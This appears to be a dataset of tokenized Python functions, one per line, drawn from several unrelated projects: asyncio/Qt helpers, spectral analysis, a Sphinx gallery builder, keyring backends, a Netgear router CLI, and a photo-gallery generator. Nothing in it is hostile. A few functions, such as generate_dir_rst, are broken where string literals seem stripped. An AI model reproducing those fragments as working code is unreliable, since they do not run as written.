def asyncClose ( fn ) : @ functools . wraps ( fn ) def wrapper ( * args , * * kwargs ) : f = asyncio . ensure_future ( fn ( * args , * * kwargs ) ) while not f . done ( ) : QApplication . instance ( ) . processEvents ( ) return wrapper
def asyncSlot ( * args ) : def outer_decorator ( fn ) : @ Slot ( * args ) @ functools . wraps ( fn ) def wrapper ( * args , * * kwargs ) : asyncio . ensure_future ( fn ( * args , * * kwargs ) ) return wrapper return outer_decorator
def with_logger ( cls ) : attr_name = '_logger' cls_name = cls . __qualname__ module = cls . __module__ if module is not None : cls_name = module + '.' + cls_name else : raise AssertionError setattr ( cls , attr_name , logging . getLogger ( cls_name ) ) return cls
def _process_event ( self , key , mask ) : self . _logger . debug ( 'Processing event with key {} and mask {}' . format ( key , mask ) ) fileobj , ( reader , writer ) = key . fileobj , key . data if mask & selectors . EVENT_READ and reader is not None : if reader . _cancelled : self . remove_reader ( fileobj ) else : self . _logger . debug ( 'Invoking reader callback: {}' . format ( reader ) ) reader . _run ( ) if mask & selectors . EVENT_WRITE and writer is not None : if writer . _cancelled : self . remove_writer ( fileobj ) else : self . _logger . debug ( 'Invoking writer callback: {}' . format ( writer ) ) writer . _run ( )
def setup ( app ) : app . add_config_value ( 'plot_gallery' , True , 'html' ) app . add_config_value ( 'abort_on_example_error' , False , 'html' ) app . add_config_value ( 'sphinx_gallery_conf' , gallery_conf , 'html' ) app . add_stylesheet ( 'gallery.css' ) app . connect ( 'builder-inited' , generate_gallery_rst ) app . connect ( 'build-finished' , embed_code_links )
def twosided_2_centerdc ( data ) : N = len ( data ) # could us int() or // in python 3 newpsd = np . concatenate ( ( cshift ( data [ N // 2 : ] , 1 ) , data [ 0 : N // 2 ] ) ) newpsd [ 0 ] = data [ - 1 ] return newpsd
def centerdc_2_twosided ( data ) : N = len ( data ) newpsd = np . concatenate ( ( data [ N // 2 : ] , ( cshift ( data [ 0 : N // 2 ] , - 1 ) ) ) ) return newpsd
def data_two_freqs ( N = 200 ) : nn = arange ( N ) xx = cos ( 0.257 * pi * nn ) + sin ( 0.2 * pi * nn ) + 0.01 * randn ( nn . size ) return xx
def spectrum_data ( filename ) : import os import pkg_resources info = pkg_resources . get_distribution ( 'spectrum' ) location = info . location # first try develop mode share = os . sep . join ( [ location , "spectrum" , 'data' ] ) filename2 = os . sep . join ( [ share , filename ] ) if os . path . exists ( filename2 ) : return filename2 else : raise Exception ( 'unknown file %s' % filename2 )
def _remove_bias ( x , axis ) : padded_slice = [ slice ( d ) for d in x . shape ] padded_slice [ axis ] = np . newaxis mn = np . mean ( x , axis = axis ) return x - mn [ tuple ( padded_slice ) ]
def codestr2rst ( codestr , lang = 'python' ) : code_directive = "\n.. code-block:: {0}\n\n" . format ( lang ) indented_block = indent ( codestr , ' ' * 4 ) return code_directive + indented_block
def get_md5sum ( src_file ) : with open ( src_file , 'r' ) as src_data : src_content = src_data . read ( ) # data needs to be encoded in python3 before hashing if sys . version_info [ 0 ] == 3 : src_content = src_content . encode ( 'utf-8' ) src_md5 = hashlib . md5 ( src_content ) . hexdigest ( ) return src_md5
def check_md5sum_change ( src_file ) : src_md5 = get_md5sum ( src_file ) src_md5_file = src_file + '.md5' src_file_changed = True if os . path . exists ( src_md5_file ) : with open ( src_md5_file , 'r' ) as file_checksum : ref_md5 = file_checksum . read ( ) if src_md5 == ref_md5 : src_file_changed = False if src_file_changed : with open ( src_md5_file , 'w' ) as file_checksum : file_checksum . write ( src_md5 ) return src_file_changed
def save_thumbnail ( image_path , base_image_name , gallery_conf ) : first_image_file = image_path . format ( 1 ) thumb_dir = os . path . join ( os . path . dirname ( first_image_file ) , 'thumb' ) if not os . path . exists ( thumb_dir ) : os . makedirs ( thumb_dir ) thumb_file = os . path . join ( thumb_dir , 'sphx_glr_%s_thumb.png' % base_image_name ) if os . path . exists ( first_image_file ) : scale_image ( first_image_file , thumb_file , 400 , 280 ) elif not os . path . exists ( thumb_file ) : # create something to replace the thumbnail default_thumb_file = os . path . join ( glr_path_static ( ) , 'no_image.png' ) default_thumb_file = gallery_conf . get ( "default_thumb_file" , default_thumb_file ) scale_image ( default_thumb_file , thumb_file , 200 , 140 )
def generate_dir_rst ( src_dir , target_dir , gallery_conf , seen_backrefs ) : if not os . path . exists ( os . path . join ( src_dir , 'README.txt' ) ) : print ( 80 * '_' ) print ( 'Example directory %s does not have a README.txt file' % src_dir ) print ( 'Skipping this directory' ) print ( 80 * '_' ) return "" # because string is an expected return type fhindex = open ( os . path . join ( src_dir , 'README.txt' ) ) . read ( ) if not os . path . exists ( target_dir ) : os . makedirs ( target_dir ) sorted_listdir = [ fname for fname in sorted ( os . listdir ( src_dir ) ) if fname . endswith ( '.py' ) ] entries_text = [ ] for fname in sorted_listdir : amount_of_code = generate_file_rst ( fname , target_dir , src_dir , gallery_conf ) new_fname = os . path . join ( src_dir , fname ) intro = extract_intro ( new_fname ) write_backreferences ( seen_backrefs , gallery_conf , target_dir , fname , intro ) this_entry = _thumbnail_div ( target_dir , fname , intro ) + % ( target_dir , fname [ : - 3 ] ) entries_text . append ( ( amount_of_code , this_entry ) ) # sort to have the smallest entries in the beginning entries_text . sort ( ) for _ , entry_text in entries_text : fhindex += entry_text # clear at the end of the section fhindex += return fhindex
def execute_script ( code_block , example_globals , image_path , fig_count , src_file , gallery_conf ) : time_elapsed = 0 stdout = '' # We need to execute the code print ( 'plotting code blocks in %s' % src_file ) plt . close ( 'all' ) cwd = os . getcwd ( ) # Redirect output to stdout and orig_stdout = sys . stdout try : # First cd in the original example dir, so that any file # created by the example get created in this directory os . chdir ( os . path . dirname ( src_file ) ) my_buffer = StringIO ( ) my_stdout = Tee ( sys . stdout , my_buffer ) sys . stdout = my_stdout t_start = time ( ) exec ( code_block , example_globals ) time_elapsed = time ( ) - t_start sys . stdout = orig_stdout my_stdout = my_buffer . getvalue ( ) . strip ( ) . expandtabs ( ) if my_stdout : stdout = CODE_OUTPUT . format ( indent ( my_stdout , ' ' * 4 ) ) os . chdir ( cwd ) figure_list = save_figures ( image_path , fig_count , gallery_conf ) # Depending on whether we have one or more figures, we're using a # horizontal list or a single rst call to 'image'. image_list = "" if len ( figure_list ) == 1 : figure_name = figure_list [ 0 ] image_list = SINGLE_IMAGE % figure_name . lstrip ( '/' ) elif len ( figure_list ) > 1 : image_list = HLIST_HEADER for figure_name in figure_list : image_list += HLIST_IMAGE_TEMPLATE % figure_name . lstrip ( '/' ) except Exception : formatted_exception = traceback . format_exc ( ) print ( 80 * '_' ) print ( '%s is not compiling:' % src_file ) print ( formatted_exception ) print ( 80 * '_' ) figure_list = [ ] image_list = codestr2rst ( formatted_exception , lang = 'pytb' ) # Overrides the output thumbnail in the gallery for easy identification broken_img = os . path . join ( glr_path_static ( ) , 'broken_example.png' ) shutil . copyfile ( broken_img , os . path . join ( cwd , image_path . format ( 1 ) ) ) fig_count += 1 # raise count to avoid overwriting image # Breaks build on first example error if gallery_conf [ 'abort_on_example_error' ] : raise finally : os . chdir ( cwd ) sys . stdout = orig_stdout print ( " - time elapsed : %.2g sec" % time_elapsed ) code_output = "\n{0}\n\n{1}\n\n" . format ( image_list , stdout ) return code_output , time_elapsed , fig_count + len ( figure_list )
def ipy_notebook_skeleton ( ) : py_version = sys . version_info notebook_skeleton = { "cells" : [ ] , "metadata" : { "kernelspec" : { "display_name" : "Python " + str ( py_version [ 0 ] ) , "language" : "python" , "name" : "python" + str ( py_version [ 0 ] ) } , "language_info" : { "codemirror_mode" : { "name" : "ipython" , "version" : py_version [ 0 ] } , "file_extension" : ".py" , "mimetype" : "text/x-python" , "name" : "python" , "nbconvert_exporter" : "python" , "pygments_lexer" : "ipython" + str ( py_version [ 0 ] ) , "version" : '{0}.{1}.{2}' . format ( * sys . version_info [ : 3 ] ) } } , "nbformat" : 4 , "nbformat_minor" : 0 } return notebook_skeleton
def save_file ( self ) : with open ( self . write_file , 'w' ) as out_nb : json . dump ( self . work_notebook , out_nb , indent = 2 )
def _select_block ( str_in , start_tag , end_tag ) : start_pos = str_in . find ( start_tag ) if start_pos < 0 : raise ValueError ( 'start_tag not found' ) depth = 0 for pos in range ( start_pos , len ( str_in ) ) : if str_in [ pos ] == start_tag : depth += 1 elif str_in [ pos ] == end_tag : depth -= 1 if depth == 0 : break sel = str_in [ start_pos + 1 : pos ] return sel
def _parse_dict_recursive ( dict_str ) : dict_out = dict ( ) pos_last = 0 pos = dict_str . find ( ':' ) while pos >= 0 : key = dict_str [ pos_last : pos ] if dict_str [ pos + 1 ] == '[' : # value is a list pos_tmp = dict_str . find ( ']' , pos + 1 ) if pos_tmp < 0 : raise RuntimeError ( 'error when parsing dict' ) value = dict_str [ pos + 2 : pos_tmp ] . split ( ',' ) # try to convert elements to int for i in range ( len ( value ) ) : try : value [ i ] = int ( value [ i ] ) except ValueError : pass elif dict_str [ pos + 1 ] == '{' : # value is another dictionary subdict_str = _select_block ( dict_str [ pos : ] , '{' , '}' ) value = _parse_dict_recursive ( subdict_str ) pos_tmp = pos + len ( subdict_str ) else : raise ValueError ( 'error when parsing dict: unknown elem' ) key = key . strip ( '"' ) if len ( key ) > 0 : dict_out [ key ] = value pos_last = dict_str . find ( ',' , pos_tmp ) if pos_last < 0 : break pos_last += 1 pos = dict_str . find ( ':' , pos_last ) return dict_out
def embed_code_links ( app , exception ) : if exception is not None : return # No need to waste time embedding hyperlinks when not running the examples # XXX: also at the time of writing this fixes make html-noplot # for some reason I don't fully understand if not app . builder . config . plot_gallery : return # XXX: Whitelist of builders for which it makes sense to embed # hyperlinks inside the example html. Note that the link embedding # require searchindex.js to exist for the links to the local doc # and there does not seem to be a good way of knowing which # builders creates a searchindex.js. if app . builder . name not in [ 'html' , 'readthedocs' ] : return print ( 'Embedding documentation hyperlinks in examples..' ) gallery_conf = app . config . sphinx_gallery_conf gallery_dirs = gallery_conf [ 'gallery_dirs' ] if not isinstance ( gallery_dirs , list ) : gallery_dirs = [ gallery_dirs ] for gallery_dir in gallery_dirs : _embed_code_links ( app , gallery_conf , gallery_dir )
def _get_link ( self , cobj ) : fname_idx = None full_name = cobj [ 'module_short' ] + '.' + cobj [ 'name' ] if full_name in self . _searchindex [ 'objects' ] : value = self . _searchindex [ 'objects' ] [ full_name ] if isinstance ( value , dict ) : value = value [ next ( iter ( value . keys ( ) ) ) ] fname_idx = value [ 0 ] elif cobj [ 'module_short' ] in self . _searchindex [ 'objects' ] : value = self . _searchindex [ 'objects' ] [ cobj [ 'module_short' ] ] if cobj [ 'name' ] in value . keys ( ) : fname_idx = value [ cobj [ 'name' ] ] [ 0 ] if fname_idx is not None : fname = self . _searchindex [ 'filenames' ] [ fname_idx ] + '.html' if self . _is_windows : fname = fname . replace ( '/' , '\\' ) link = os . path . join ( self . doc_url , fname ) else : link = posixpath . join ( self . doc_url , fname ) if hasattr ( link , 'decode' ) : link = link . decode ( 'utf-8' , 'replace' ) if link in self . _page_cache : html = self . _page_cache [ link ] else : html = get_data ( link , self . gallery_dir ) self . _page_cache [ link ] = html # test if cobj appears in page comb_names = [ cobj [ 'module_short' ] + '.' + cobj [ 'name' ] ] if self . extra_modules_test is not None : for mod in self . extra_modules_test : comb_names . append ( mod + '.' + cobj [ 'name' ] ) url = False if hasattr ( html , 'decode' ) : # Decode bytes under Python 3 html = html . decode ( 'utf-8' , 'replace' ) for comb_name in comb_names : if hasattr ( comb_name , 'decode' ) : # Decode bytes under Python 3 comb_name = comb_name . decode ( 'utf-8' , 'replace' ) if comb_name in html : url = link + u'#' + comb_name link = url else : link = False return link
def get_short_module_name ( module_name , obj_name ) : parts = module_name . split ( '.' ) short_name = module_name for i in range ( len ( parts ) - 1 , 0 , - 1 ) : short_name = '.' . join ( parts [ : i ] ) try : exec ( 'from %s import %s' % ( short_name , obj_name ) ) except ImportError : # get the last working module name short_name = '.' . join ( parts [ : ( i + 1 ) ] ) break return short_name
def _thumbnail_div ( full_dir , fname , snippet , is_backref = False ) : thumb = os . path . join ( full_dir , 'images' , 'thumb' , 'sphx_glr_%s_thumb.png' % fname [ : - 3 ] ) ref_name = os . path . join ( full_dir , fname ) . replace ( os . path . sep , '_' ) template = BACKREF_THUMBNAIL_TEMPLATE if is_backref else THUMBNAIL_TEMPLATE return template . format ( snippet = snippet , thumbnail = thumb , ref_name = ref_name )
def main ( argv = None ) : if argv is None : argv = sys . argv [ 1 : ] cli = CommandLineTool ( ) return cli . run ( argv )
def pass_from_pipe ( cls ) : is_pipe = not sys . stdin . isatty ( ) return is_pipe and cls . strip_last_newline ( sys . stdin . read ( ) )
def get_password ( self , service , username ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise KeyringLocked ( "Failed to unlock the keyring!" ) if not self . iface . hasEntry ( self . handle , service , username , self . appid ) : return None password = self . iface . readPassword ( self . handle , service , username , self . appid ) return str ( password )
def set_password ( self , service , username , password ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise PasswordSetError ( "Cancelled by user" ) self . iface . writePassword ( self . handle , service , username , password , self . appid )
def delete_password ( self , service , username ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise PasswordDeleteError ( "Cancelled by user" ) if not self . iface . hasEntry ( self . handle , service , username , self . appid ) : raise PasswordDeleteError ( "Password not found" ) self . iface . removeEntry ( self . handle , service , username , self . appid )
def _get_env ( self , env_var ) : value = os . environ . get ( env_var ) if not value : raise ValueError ( 'Missing environment variable:%s' % env_var ) return value
def get_password ( self , service , username ) : collection = self . get_preferred_collection ( ) items = collection . search_items ( { "username" : username , "service" : service } ) for item in items : if hasattr ( item , 'unlock' ) : item . unlock ( ) if item . is_locked ( ) : # User dismissed the prompt raise KeyringLocked ( 'Failed to unlock the item!' ) return item . get_secret ( ) . decode ( 'utf-8' )
def set_password ( self , service , username , password ) : collection = self . get_preferred_collection ( ) attributes = { "application" : self . appid , "service" : service , "username" : username } label = "Password for '{}' on '{}'" . format ( username , service ) collection . create_item ( label , attributes , password , replace = True )
def backends ( cls ) : allowed = ( keyring for keyring in filter ( backend . _limit , backend . get_all_keyring ( ) ) if not isinstance ( keyring , ChainerBackend ) and keyring . priority > 0 ) return sorted ( allowed , key = backend . by_priority , reverse = True )
def set_keyring ( keyring ) : global _keyring_backend if not isinstance ( keyring , backend . KeyringBackend ) : raise TypeError ( "The keyring must be a subclass of KeyringBackend" ) _keyring_backend = keyring
def disable ( ) : root = platform . config_root ( ) try : os . makedirs ( root ) except OSError : pass filename = os . path . join ( root , 'keyringrc.cfg' ) if os . path . exists ( filename ) : msg = "Refusing to overwrite {filename}" . format ( * * locals ( ) ) raise RuntimeError ( msg ) with open ( filename , 'w' ) as file : file . write ( '[backend]\ndefault-keyring=keyring.backends.null.Keyring' )
def load_config ( ) : filename = 'keyringrc.cfg' keyring_cfg = os . path . join ( platform . config_root ( ) , filename ) if not os . path . exists ( keyring_cfg ) : return config = configparser . RawConfigParser ( ) config . read ( keyring_cfg ) _load_keyring_path ( config ) # load the keyring class name, and then load this keyring try : if config . has_section ( "backend" ) : keyring_name = config . get ( "backend" , "default-keyring" ) . strip ( ) else : raise configparser . NoOptionError ( 'backend' , 'default-keyring' ) except ( configparser . NoOptionError , ImportError ) : logger = logging . getLogger ( 'keyring' ) logger . warning ( "Keyring config file contains incorrect values.\n" + "Config file: %s" % keyring_cfg ) return return load_keyring ( keyring_name )
def make_formatter ( format_name ) : if "json" in format_name : from json import dumps import datetime def jsonhandler ( obj ) : obj . isoformat ( ) if isinstance ( obj , ( datetime . datetime , datetime . date ) ) else obj if format_name == "prettyjson" : def jsondumps ( data ) : return dumps ( data , default = jsonhandler , indent = 2 , separators = ( ',' , ': ' ) ) else : def jsondumps ( data ) : return dumps ( data , default = jsonhandler ) def jsonify ( data ) : if isinstance ( data , dict ) : print ( jsondumps ( data ) ) elif isinstance ( data , list ) : print ( jsondumps ( [ device . _asdict ( ) for device in data ] ) ) else : print ( dumps ( { 'result' : data } ) ) return jsonify else : def printer ( data ) : if isinstance ( data , dict ) : print ( data ) else : for row in data : print ( row ) return printer
def argparser ( ) : parser = ArgumentParser ( prog = 'pynetgear' ) parser . add_argument ( "--format" , choices = [ 'json' , 'prettyjson' , 'py' ] , default = 'prettyjson' ) router_args = parser . add_argument_group ( "router connection config" ) router_args . add_argument ( "--host" , help = "Hostname for the router" ) router_args . add_argument ( "--user" , help = "Account for login" ) router_args . add_argument ( "--port" , help = "Port exposed on the router" ) router_args . add_argument ( "--login-v2" , help = "Force the use of the cookie-based authentication" , dest = "force_login_v2" , default = False , action = "store_true" ) router_args . add_argument ( "--password" , help = "Not required with a wired connection." + "Optionally, set the PYNETGEAR_PASSWORD environment variable" ) router_args . add_argument ( "--url" , help = "Overrides host:port and ssl with url to router" ) router_args . add_argument ( "--no-ssl" , dest = "ssl" , default = True , action = "store_false" , help = "Connect with https" ) subparsers = parser . add_subparsers ( description = "Runs subcommand against the specified router" , dest = "subcommand" ) block_parser = subparsers . add_parser ( "block_device" , help = "Blocks a device from connecting by mac address" ) block_parser . add_argument ( "--mac-addr" ) allow_parser = subparsers . add_parser ( "allow_device" , help = "Allows a device with the mac address to connect" ) allow_parser . add_argument ( "--mac-addr" ) subparsers . add_parser ( "login" , help = "Attempts to login to router." ) attached_devices = subparsers . add_parser ( "attached_devices" , help = "Outputs all attached devices" ) attached_devices . add_argument ( "-v" , "--verbose" , action = "store_true" , default = False , help = "Choose between verbose and slower or terse and fast." ) subparsers . add_parser ( "traffic_meter" , help = "Output router's traffic meter data" ) return parser
def run_subcommand ( netgear , args ) : subcommand = args . subcommand if subcommand == "block_device" or subcommand == "allow_device" : return netgear . allow_block_device ( args . mac_addr , BLOCK if subcommand == "block_device" else ALLOW ) if subcommand == "attached_devices" : if args . verbose : return netgear . get_attached_devices_2 ( ) else : return netgear . get_attached_devices ( ) if subcommand == 'traffic_meter' : return netgear . get_traffic_meter ( ) if subcommand == 'login' : return netgear . login ( ) print ( "Unknown subcommand" )
def main ( ) : args = argparser ( ) . parse_args ( sys . argv [ 1 : ] ) password = os . environ . get ( 'PYNETGEAR_PASSWORD' ) or args . password netgear = Netgear ( password , args . host , args . user , args . port , args . ssl , args . url , args . force_login_v2 ) results = run_subcommand ( netgear , args ) formatter = make_formatter ( args . format ) if results is None : print ( "Error communicating with the Netgear router" ) else : formatter ( results )
def _convert ( value , to_type , default = None ) : try : return default if value is None else to_type ( value ) except ValueError : # If value could not be converted return default
def _make_request ( self , service , method , params = None , body = "" , need_auth = True ) : # If we have no cookie (v2) or never called login before (v1) # and we need auth, the request will fail for sure. if need_auth and not self . cookie : if not self . login ( ) : return False , None headers = self . _get_headers ( service , method , need_auth ) if not body : if not params : params = "" if isinstance ( params , dict ) : _map = params params = "" for k in _map : params += "<" + k + ">" + _map [ k ] + "</" + k + ">\n" body = CALL_BODY . format ( service = SERVICE_PREFIX + service , method = method , params = params ) message = SOAP_REQUEST . format ( session_id = SESSION_ID , body = body ) try : response = requests . post ( self . soap_url , headers = headers , data = message , timeout = 30 , verify = False ) if need_auth and _is_unauthorized_response ( response ) : # let's discard the cookie because it probably expired (v2) # or the IP-bound (?) session expired (v1) self . cookie = None _LOGGER . warning ( "Unauthorized response, let's login and retry..." ) if self . login ( ) : # reset headers with new cookie first headers = self . _get_headers ( service , method , need_auth ) response = requests . post ( self . soap_url , headers = headers , data = message , timeout = 30 , verify = False ) success = _is_valid_response ( response ) if not success : _LOGGER . error ( "Invalid response" ) _LOGGER . debug ( "%s\n%s\n%s" , response . status_code , str ( response . headers ) , response . text ) return success , response except requests . exceptions . RequestException : _LOGGER . exception ( "Error talking to API" ) # Maybe one day we will distinguish between # different errors.. return False , None
def _gethostbyname ( self , hostname ) : if self . _databaseType in const . IPV6_EDITIONS : response = socket . getaddrinfo ( hostname , 0 , socket . AF_INET6 ) family , socktype , proto , canonname , sockaddr = response [ 0 ] address , port , flow , scope = sockaddr return address else : return socket . gethostbyname ( hostname )
def compress ( self , filename ) : compressed_filename = self . get_compressed_filename ( filename ) if not compressed_filename : return self . do_compress ( filename , compressed_filename )
def copy ( src , dst , symlink = False , rellink = False ) : func = os . symlink if symlink else shutil . copy2 if symlink and os . path . lexists ( dst ) : os . remove ( dst ) if rellink : # relative symlink from dst func ( os . path . relpath ( src , os . path . dirname ( dst ) ) , dst ) else : func ( src , dst )
def url_from_path ( path ) : if os . sep != '/' : path = '/' . join ( path . split ( os . sep ) ) return quote ( path )
def load_exif ( album ) : if not hasattr ( album . gallery , "exifCache" ) : _restore_cache ( album . gallery ) cache = album . gallery . exifCache for media in album . medias : if media . type == "image" : key = os . path . join ( media . path , media . filename ) if key in cache : media . exif = cache [ key ]
def _restore_cache ( gallery ) : cachePath = os . path . join ( gallery . settings [ "destination" ] , ".exif_cache" ) try : if os . path . exists ( cachePath ) : with open ( cachePath , "rb" ) as cacheFile : gallery . exifCache = pickle . load ( cacheFile ) logger . debug ( "Loaded cache with %d entries" , len ( gallery . exifCache ) ) else : gallery . exifCache = { } except Exception as e : logger . warn ( "Could not load cache: %s" , e ) gallery . exifCache = { }
def save_cache ( gallery ) : if hasattr ( gallery , "exifCache" ) : cache = gallery . exifCache else : cache = gallery . exifCache = { } for album in gallery . albums . values ( ) : for image in album . images : cache [ os . path . join ( image . path , image . filename ) ] = image . exif cachePath = os . path . join ( gallery . settings [ "destination" ] , ".exif_cache" ) if len ( cache ) == 0 : if os . path . exists ( cachePath ) : os . remove ( cachePath ) return try : with open ( cachePath , "wb" ) as cacheFile : pickle . dump ( cache , cacheFile ) logger . debug ( "Stored cache with %d entries" , len ( gallery . exifCache ) ) except Exception as e : logger . warn ( "Could not store cache: %s" , e ) os . remove ( cachePath )
def filter_nomedia ( album , settings = None ) : nomediapath = os . path . join ( album . src_path , ".nomedia" ) if os . path . isfile ( nomediapath ) : if os . path . getsize ( nomediapath ) == 0 : logger . info ( "Ignoring album '%s' because of present 0-byte " ".nomedia file" , album . name ) # subdirs have been added to the gallery already, remove them # there, too _remove_albums_with_subdirs ( album . gallery . albums , [ album . path ] ) try : os . rmdir ( album . dst_path ) except OSError as e : # directory was created and populated with images in a # previous run => keep it pass # cannot set albums => empty subdirs so that no albums are # generated album . subdirs = [ ] album . medias = [ ] else : with open ( nomediapath , "r" ) as nomediaFile : logger . info ( "Found a .nomedia file in %s, ignoring its " "entries" , album . name ) ignored = nomediaFile . read ( ) . split ( "\n" ) album . medias = [ media for media in album . medias if media . src_filename not in ignored ] album . subdirs = [ dirname for dirname in album . subdirs if dirname not in ignored ] # subdirs have been added to the gallery already, remove # them there, too _remove_albums_with_subdirs ( album . gallery . albums , ignored , album . path + os . path . sep )
def serve ( destination , port , config ) : if os . path . exists ( destination ) : pass elif os . path . exists ( config ) : settings = read_settings ( config ) destination = settings . get ( 'destination' ) if not os . path . exists ( destination ) : sys . stderr . write ( "The '{}' directory doesn't exist, maybe try " "building first?\n" . format ( destination ) ) sys . exit ( 1 ) else : sys . stderr . write ( "The {destination} directory doesn't exist " "and the config file ({config}) could not be read.\n" . format ( destination = destination , config = config ) ) sys . exit ( 2 ) print ( 'DESTINATION : {}' . format ( destination ) ) os . chdir ( destination ) Handler = server . SimpleHTTPRequestHandler httpd = socketserver . TCPServer ( ( "" , port ) , Handler , False ) print ( " * Running on http://127.0.0.1:{}/" . format ( port ) ) try : httpd . allow_reuse_address = True httpd . server_bind ( ) httpd . server_activate ( ) httpd . serve_forever ( ) except KeyboardInterrupt : print ( '\nAll done!' )
def generate_thumbnail ( source , outname , box , fit = True , options = None , thumb_fit_centering = ( 0.5 , 0.5 ) ) : logger = logging . getLogger ( __name__ ) img = _read_image ( source ) original_format = img . format if fit : img = ImageOps . fit ( img , box , PILImage . ANTIALIAS , centering = thumb_fit_centering ) else : img . thumbnail ( box , PILImage . ANTIALIAS ) outformat = img . format or original_format or 'JPEG' logger . debug ( 'Save thumnail image: %s (%s)' , outname , outformat ) save_image ( img , outname , outformat , options = options , autoconvert = True )
def get_exif_data ( filename ) : logger = logging . getLogger ( __name__ ) img = _read_image ( filename ) try : exif = img . _getexif ( ) or { } except ZeroDivisionError : logger . warning ( 'Failed to read EXIF data.' ) return None data = { TAGS . get ( tag , tag ) : value for tag , value in exif . items ( ) } if 'GPSInfo' in data : try : data [ 'GPSInfo' ] = { GPSTAGS . get ( tag , tag ) : value for tag , value in data [ 'GPSInfo' ] . items ( ) } except AttributeError : logger = logging . getLogger ( __name__ ) logger . info ( 'Failed to get GPS Info' ) del data [ 'GPSInfo' ] return data
def get_iptc_data ( filename ) : logger = logging . getLogger ( __name__ ) iptc_data = { } raw_iptc = { } # PILs IptcImagePlugin issues a SyntaxError in certain circumstances # with malformed metadata, see PIL/IptcImagePlugin.py", line 71. try : img = _read_image ( filename ) raw_iptc = IptcImagePlugin . getiptcinfo ( img ) except SyntaxError : logger . info ( 'IPTC Error in %s' , filename ) # IPTC fields are catalogued in: # https://www.iptc.org/std/photometadata/specification/IPTC-PhotoMetadata # 2:05 is the IPTC title property if raw_iptc and ( 2 , 5 ) in raw_iptc : iptc_data [ "title" ] = raw_iptc [ ( 2 , 5 ) ] . decode ( 'utf-8' , errors = 'replace' ) # 2:120 is the IPTC description property if raw_iptc and ( 2 , 120 ) in raw_iptc : iptc_data [ "description" ] = raw_iptc [ ( 2 , 120 ) ] . decode ( 'utf-8' , errors = 'replace' ) # 2:105 is the IPTC headline property if raw_iptc and ( 2 , 105 ) in raw_iptc : iptc_data [ "headline" ] = raw_iptc [ ( 2 , 105 ) ] . decode ( 'utf-8' , errors = 'replace' ) return iptc_data
def get_exif_tags ( data , datetime_format = '%c' ) : logger = logging . getLogger ( __name__ ) simple = { } for tag in ( 'Model' , 'Make' , 'LensModel' ) : if tag in data : if isinstance ( data [ tag ] , tuple ) : simple [ tag ] = data [ tag ] [ 0 ] . strip ( ) else : simple [ tag ] = data [ tag ] . strip ( ) if 'FNumber' in data : fnumber = data [ 'FNumber' ] try : simple [ 'fstop' ] = float ( fnumber [ 0 ] ) / fnumber [ 1 ] except Exception : logger . debug ( 'Skipped invalid FNumber: %r' , fnumber , exc_info = True ) if 'FocalLength' in data : focal = data [ 'FocalLength' ] try : simple [ 'focal' ] = round ( float ( focal [ 0 ] ) / focal [ 1 ] ) except Exception : logger . debug ( 'Skipped invalid FocalLength: %r' , focal , exc_info = True ) if 'ExposureTime' in data : exptime = data [ 'ExposureTime' ] if isinstance ( exptime , tuple ) : try : simple [ 'exposure' ] = str ( fractions . Fraction ( exptime [ 0 ] , exptime [ 1 ] ) ) except ZeroDivisionError : logger . info ( 'Invalid ExposureTime: %r' , exptime ) elif isinstance ( exptime , int ) : simple [ 'exposure' ] = str ( exptime ) else : logger . info ( 'Unknown format for ExposureTime: %r' , exptime ) if data . get ( 'ISOSpeedRatings' ) : simple [ 'iso' ] = data [ 'ISOSpeedRatings' ] if 'DateTimeOriginal' in data : # Remove null bytes at the end if necessary date = data [ 'DateTimeOriginal' ] . rsplit ( '\x00' ) [ 0 ] try : simple [ 'dateobj' ] = datetime . strptime ( date , '%Y:%m:%d %H:%M:%S' ) simple [ 'datetime' ] = simple [ 'dateobj' ] . strftime ( datetime_format ) except ( ValueError , TypeError ) as e : logger . info ( 'Could not parse DateTimeOriginal: %s' , e ) if 'GPSInfo' in data : info = data [ 'GPSInfo' ] lat_info = info . get ( 'GPSLatitude' ) lon_info = info . get ( 'GPSLongitude' ) lat_ref_info = info . get ( 'GPSLatitudeRef' ) lon_ref_info = info . get ( 'GPSLongitudeRef' ) if lat_info and lon_info and lat_ref_info and lon_ref_info : try : lat = dms_to_degrees ( lat_info ) lon = dms_to_degrees ( lon_info ) except ( ZeroDivisionError , ValueError , TypeError ) : logger . info ( 'Failed to read GPS info' ) else : simple [ 'gps' ] = { 'lat' : - lat if lat_ref_info != 'N' else lat , 'lon' : - lon if lon_ref_info != 'E' else lon , } return simple
def create_output_directories ( self ) : check_or_create_dir ( self . dst_path ) if self . medias : check_or_create_dir ( join ( self . dst_path , self . settings [ 'thumb_dir' ] ) ) if self . medias and self . settings [ 'keep_orig' ] : self . orig_path = join ( self . dst_path , self . settings [ 'orig_dir' ] ) check_or_create_dir ( self . orig_path )
def url ( self ) : url = self . name . encode ( 'utf-8' ) return url_quote ( url ) + '/' + self . url_ext
def thumbnail ( self ) : if self . _thumbnail : # stop if it is already set return self . _thumbnail # Test the thumbnail from the Markdown file. thumbnail = self . meta . get ( 'thumbnail' , [ '' ] ) [ 0 ] if thumbnail and isfile ( join ( self . src_path , thumbnail ) ) : self . _thumbnail = url_from_path ( join ( self . name , get_thumb ( self . settings , thumbnail ) ) ) self . logger . debug ( "Thumbnail for %r : %s" , self , self . _thumbnail ) return self . _thumbnail else : # find and return the first landscape image for f in self . medias : ext = splitext ( f . filename ) [ 1 ] if ext . lower ( ) in self . settings [ 'img_extensions' ] : # Use f.size if available as it is quicker (in cache), but # fallback to the size of src_path if dst_path is missing size = f . size if size is None : size = get_size ( f . src_path ) if size [ 'width' ] > size [ 'height' ] : self . _thumbnail = ( url_quote ( self . name ) + '/' + f . thumbnail ) self . logger . debug ( "Use 1st landscape image as thumbnail for %r : %s" , self , self . _thumbnail ) return self . _thumbnail # else simply return the 1st media file if not self . _thumbnail and self . medias : for media in self . medias : if media . thumbnail is not None : self . _thumbnail = ( url_quote ( self . name ) + '/' + media . thumbnail ) break else : self . logger . warning ( "No thumbnail found for %r" , self ) return None self . logger . debug ( "Use the 1st image as thumbnail for %r : %s" , self , self . _thumbnail ) return self . _thumbnail # use the thumbnail of their sub-directories if not self . _thumbnail : for path , album in self . gallery . get_albums ( self . path ) : if album . thumbnail : self . _thumbnail = ( url_quote ( self . name ) + '/' + album . thumbnail ) self . logger . debug ( "Using thumbnail from sub-directory 